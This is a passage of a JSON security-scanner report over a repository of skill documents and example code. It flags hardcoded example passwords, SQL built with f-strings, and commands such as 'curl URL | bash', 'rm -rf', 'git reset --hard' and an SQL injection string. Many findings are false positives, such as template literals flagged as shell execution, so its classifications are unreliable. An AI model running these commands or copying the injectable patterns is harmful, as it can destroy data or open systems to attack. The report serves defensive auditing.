        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 402,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Reconstructed order`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 403,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Customer: ${reconstructed.getCustomerId()}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 404,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Items: ${reconstructed.getItems().length}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 405,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Total: $${reconstructed.getTotalAmount().toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 406,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Status: ${reconstructed.getStatus()}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 407,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Version: ${reconstructed.getVersion()}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 45,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Doc 1: \"${text1.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 46,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Doc 2: \"${text2.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 51,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Doc 1: \"${text1.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 52,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Doc 2: \"${text2.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 76,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Initial: \"${text1.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 84,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Doc 1: \"${text1.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 89,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Doc 2: \"${text2.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 96,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\\nDoc 1: \"${text1.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 97,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Doc 2: \"${text2.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 129,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Doc 1: ${JSON.stringify(map1.toJSON())}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 130,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Doc 2: ${JSON.stringify(map2.toJSON())}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 139,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Doc 1: ${JSON.stringify(array1.toJSON())}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 140,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Doc 2: ${JSON.stringify(array2.toJSON())}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 216,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${user}'s todos:`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 221,
        "issue": "Backtick command execution",
        "evidence": "console.log(`    [${status}] ${text}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 243,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  After insert: \"${text.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 246,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  After insert: \"${text.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 249,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  After insert: \"${text.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 254,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  After undo: \"${text.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 257,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  After undo: \"${text.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 262,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  After redo: \"${text.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 265,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  After redo: \"${text.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 287,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Text: \"${text1.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 288,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Metadata: ${JSON.stringify(map1.toJSON())}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 292,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\\nSerialized to ${state.length} bytes`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 305,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Text: \"${text2.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 306,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Metadata: ${JSON.stringify(map2.toJSON())}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 328,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Inserted: \"${change.insert}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 330,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Deleted: ${change.delete} characters`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 332,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Retained: ${change.retain} characters`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 347,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\\nFinal text: \"${text.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      }
    ],
    "SQL Injection Risk": [
      {
        "severity": "HIGH",
        "category": "SQL Injection Risk",
        "file": "skills/cryptography/secrets-rotation/resources/examples/04_postgresql_zero_downtime_rotation.py",
        "line_number": 146,
        "issue": "Possible SQL injection via f-string",
        "evidence": "cursor.execute(f\"DROP USER IF EXISTS {secondary_user}\")",
        "recommendation": "Use parameterized queries"
      },
      {
        "severity": "HIGH",
        "category": "SQL Injection Risk",
        "file": "skills/cryptography/secrets-rotation/resources/examples/04_postgresql_zero_downtime_rotation.py",
        "line_number": 177,
        "issue": "Possible SQL injection via f-string",
        "evidence": "cursor.execute(f\"GRANT {role} TO {secondary_user}\")",
        "recommendation": "Use parameterized queries"
      },
      {
        "severity": "HIGH",
        "category": "SQL Injection Risk",
        "file": "skills/cryptography/secrets-rotation/resources/examples/04_postgresql_zero_downtime_rotation.py",
        "line_number": 195,
        "issue": "Possible SQL injection via f-string",
        "evidence": "cursor.execute(f\"DROP USER IF EXISTS {username}\")",
        "recommendation": "Use parameterized queries"
      },
      {
        "severity": "HIGH",
        "category": "SQL Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/analyze_metrics.py",
        "line_number": 93,
        "issue": "Possible SQL injection via string concatenation",
        "evidence": "result = self.query('{__name__=~\".+\"}')",
        "recommendation": "Use parameterized queries"
      },
      {
        "severity": "HIGH",
        "category": "SQL Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/analyze_metrics.py",
        "line_number": 108,
        "issue": "Possible SQL injection via string concatenation",
        "evidence": "result = self.query('count by (__name__) ({__name__=~\".+\"})')",
        "recommendation": "Use parameterized queries"
      },
      {
        "severity": "HIGH",
        "category": "SQL Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/analyze_query.py",
        "line_number": 356,
        "issue": "Possible SQL injection via f-string",
        "evidence": "cur.execute(f\"EXPLAIN (ANALYZE, BUFFERS) {args.query}\")",
        "recommendation": "Use parameterized queries"
      },
      {
        "severity": "HIGH",
        "category": "SQL Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/python/user_projection.py",
        "line_number": 201,
        "issue": "Possible SQL injection via f-string",
        "evidence": "cursor.execute(f\"TRUNCATE TABLE {self.projection_name}\")",
        "recommendation": "Use parameterized queries"
      },
      {
        "severity": "HIGH",
        "category": "SQL Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/scripts/replay_events.py",
        "line_number": 331,
        "issue": "Possible SQL injection via f-string",
        "evidence": "# cursor.execute(f\"TRUNCATE TABLE {self.projection_name}\")",
        "recommendation": "Use parameterized queries"
      }
    ]
  },
  "all_findings": [
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/cloud-kubernetes-deployment.md",
      "line_number": 358,
      "issue": "Possible hardcoded password",
      "evidence": "db.password: \"changeme123\"  # Example only - use secret management in production",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cloud-kubernetes-deployment.md",
      "line_number": 426,
      "issue": "Unencrypted HTTP",
      "evidence": "kubectl run -it --rm debug --image=curlimages/curl --restart=Never -- curl http://web",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/SECURITY.md",
      "line_number": 43,
      "issue": "Possible hardcoded password",
      "evidence": "password = \"MyRealPassword123\"",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/SECURITY.md",
      "line_number": 61,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf /path/to/data  # DESTRUCTIVE - requires confirmation",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Network Security",
      "file": "skills/SECURITY.md",
      "line_number": 114,
      "issue": "Pipe curl to shell",
      "evidence": "- `curl URL | bash` or `wget URL | sh`",
      "recommendation": "Download, verify, then execute"
    },
    {
      "severity": "CRITICAL",
      "category": "Network Security",
      "file": "skills/SECURITY.md",
      "line_number": 114,
      "issue": "Pipe wget to shell",
      "evidence": "- `curl URL | bash` or `wget URL | sh`",
      "recommendation": "Download, verify, then execute"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/SECURITY.md",
      "line_number": 116,
      "issue": "Destructive file deletion",
      "evidence": "- `rm -rf` without confirmation",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/SECURITY.md",
      "line_number": 130,
      "issue": "Possible hardcoded password",
      "evidence": "DB_PASSWORD=\"xK9mP2nQ7sL4\"",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/workflow/project-synthesis/resources/REFERENCE.md",
      "line_number": 193,
      "issue": "Destructive git operation",
      "evidence": "git reset --hard $BASELINE_COMMIT",
      "recommendation": "Warn about data loss and require confirmation"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/workflow/project-synthesis/resources/REFERENCE.md",
      "line_number": 307,
      "issue": "Destructive git operation",
      "evidence": "2. **REVERT** - `git reset --hard $BASELINE_COMMIT`  <!-- Intentional recovery step -->",
      "recommendation": "Warn about data loss and require confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/api/api-authorization.md",
      "line_number": 462,
      "issue": "Unencrypted HTTP",
      "evidence": "\"http://opa:8181/v1/data/app/authz/allow\",",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/api/api-rate-limiting.md",
      "line_number": 1013,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/api/api-authentication/resources/scripts/README.md",
      "line_number": 173,
      "issue": "Possible hardcoded token",
      "evidence": "TOKEN=\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\"  # Test token for security audit only",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/api/api-authentication/resources/scripts/README.md",
      "line_number": 368,
      "issue": "Path traversal pattern",
      "evidence": "- `../REFERENCE.md` - Detailed JWT/OAuth specifications",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/api/api-authentication/resources/scripts/README.md",
      "line_number": 369,
      "issue": "Path traversal pattern",
      "evidence": "- `../examples/` - Implementation examples",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/api/api-authentication/resources/scripts/README.md",
      "line_number": 370,
      "issue": "Path traversal pattern",
      "evidence": "- Main skill: `../../api-authentication.md`",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
      "line_number": 356,
      "issue": "Unencrypted HTTP",
      "evidence": "curl \"http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
      "line_number": 359,
      "issue": "Unencrypted HTTP",
      "evidence": "curl -X POST \"http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/${RequestId}/response\" \\",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
      "line_number": 363,
      "issue": "Unencrypted HTTP",
      "evidence": "curl -X POST \"http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/${RequestId}/error\" \\",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
      "line_number": 377,
      "issue": "Unencrypted HTTP",
      "evidence": "\"http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next\")",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
      "line_number": 385,
      "issue": "Unencrypted HTTP",
      "evidence": "curl -sS -X POST \"http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/$REQUEST_ID/response\" \\",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
      "line_number": 1255,
      "issue": "Path traversal pattern",
      "evidence": "zip -r ../layer.zip .",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
      "line_number": 3057,
      "issue": "Path traversal pattern",
      "evidence": "zip -r ../layer.zip .",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
      "line_number": 3093,
      "issue": "Unencrypted HTTP",
      "evidence": "\"http://${AWS_LAMBDA_RUNTIME_API}/2020-01-01/extension/register\" \\",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
      "line_number": 3102,
      "issue": "Unencrypted HTTP",
      "evidence": "\"http://${AWS_LAMBDA_RUNTIME_API}/2020-01-01/extension/event/next\" \\",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/cloud/aws/aws-databases.md",
      "line_number": 53,
      "issue": "Possible hardcoded password",
      "evidence": "MasterUserPassword='SecurePassword123!',  # Example only - use AWS Secrets Manager in production",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/cloud/aws/aws-databases.md",
      "line_number": 301,
      "issue": "Possible hardcoded password",
      "evidence": "MasterUserPassword='SecurePassword123!',  # Example only - use AWS Secrets Manager in production",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/cloud/aws/aws-databases.md",
      "line_number": 375,
      "issue": "Possible hardcoded password",
      "evidence": "Password='migration_password'  # Example only - use AWS Secrets Manager in production",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/cloud/aws/aws-databases.md",
      "line_number": 387,
      "issue": "Possible hardcoded password",
      "evidence": "Password='SecurePassword123!'  # Example only - use AWS Secrets Manager in production",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/cloud/aws/aws-databases.md",
      "line_number": 432,
      "issue": "Possible hardcoded password",
      "evidence": "password='SecurePassword123!'  # Example only - use AWS Secrets Manager in production",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cloud/aws/aws-api-gateway.md",
      "line_number": 406,
      "issue": "Unencrypted HTTP",
      "evidence": "\"$schema\": \"http://json-schema.org/draft-04/schema#\",",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cloud/aws/aws-ec2-compute.md",
      "line_number": 525,
      "issue": "Unencrypted HTTP",
      "evidence": "METADATA_URL = \"http://169.254.169.254/latest/meta-data/\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cloud/aws/aws-ec2-compute.md",
      "line_number": 526,
      "issue": "Unencrypted HTTP",
      "evidence": "TOKEN_URL = \"http://169.254.169.254/latest/api/token\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cloud/gcp/gcp-storage.md",
      "line_number": 256,
      "issue": "Privilege escalation",
      "evidence": "sudo apt-get install nfs-common",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cloud/gcp/gcp-storage.md",
      "line_number": 257,
      "issue": "Privilege escalation",
      "evidence": "sudo mkdir -p /mnt/shared",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cloud/gcp/gcp-storage.md",
      "line_number": 258,
      "issue": "Privilege escalation",
      "evidence": "sudo mount 10.0.0.2:/data /mnt/shared  # Use IP from filestore instance",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cloud/gcp/gcp-storage.md",
      "line_number": 261,
      "issue": "Privilege escalation",
      "evidence": "echo \"10.0.0.2:/data /mnt/shared nfs defaults 0 0\" | sudo tee -a /etc/fstab",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/cloud/gcp/gcp-iam-security.md",
      "line_number": 570,
      "issue": "Possible hardcoded password",
      "evidence": "DATABASE_PASSWORD = \"super_secret_password\"  # Exposed in source control! Example only",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cloud/kubernetes-deployment/resources/REFERENCE.md",
      "line_number": 1623,
      "issue": "Unencrypted HTTP",
      "evidence": "url: http://flagger-loadtester/",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cloud/kubernetes-deployment/resources/REFERENCE.md",
      "line_number": 1626,
      "issue": "Unencrypted HTTP",
      "evidence": "cmd: \"hey -z 1m -q 10 -c 2 http://myapp/\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cloud/kubernetes-deployment/resources/REFERENCE.md",
      "line_number": 3696,
      "issue": "Unencrypted HTTP",
      "evidence": "serverAddress: http://prometheus.monitoring.svc.cluster.local:9090",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cloud/kubernetes-deployment/resources/REFERENCE.md",
      "line_number": 4383,
      "issue": "Unencrypted HTTP",
      "evidence": "kubectl run -it --rm debug --image=curlimages/curl --restart=Never -- curl http://<service-name>",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "CRITICAL",
      "category": "Network Security",
      "file": "skills/wasm/wasm-rust-toolchain.md",
      "line_number": 207,
      "issue": "Pipe curl to shell",
      "evidence": "curl https://rustwasm.github.io/wasm-pack/installer/init.sh -sSf | sh",
      "recommendation": "Download, verify, then execute"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/testing/integration-testing/resources/REFERENCE.md",
      "line_number": 1070,
      "issue": "Path traversal pattern",
      "evidence": "import { app } from '../app';",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/testing/integration-testing/resources/REFERENCE.md",
      "line_number": 1898,
      "issue": "Destructive database operation",
      "evidence": "users = repo.search(\"'; DROP TABLE users; --\")  # Example attack - should be safely handled",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
      "line_number": 1649,
      "issue": "Destructive database operation",
      "evidence": "await pool.query('TRUNCATE users, products, orders CASCADE');",
      "recommendation": "Require backup and confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
      "line_number": 2706,
      "issue": "Path traversal pattern",
      "evidence": "import { LoginPage } from '../../pages/LoginPage';",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
      "line_number": 2775,
      "issue": "Path traversal pattern",
      "evidence": "import { LoginPage } from '../pages/LoginPage';",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
      "line_number": 2776,
      "issue": "Path traversal pattern",
      "evidence": "import { DashboardPage } from '../pages/DashboardPage';",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
      "line_number": 3851,
      "issue": "Path traversal pattern",
      "evidence": "import { ProductPage } from '../pages/ProductPage';",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
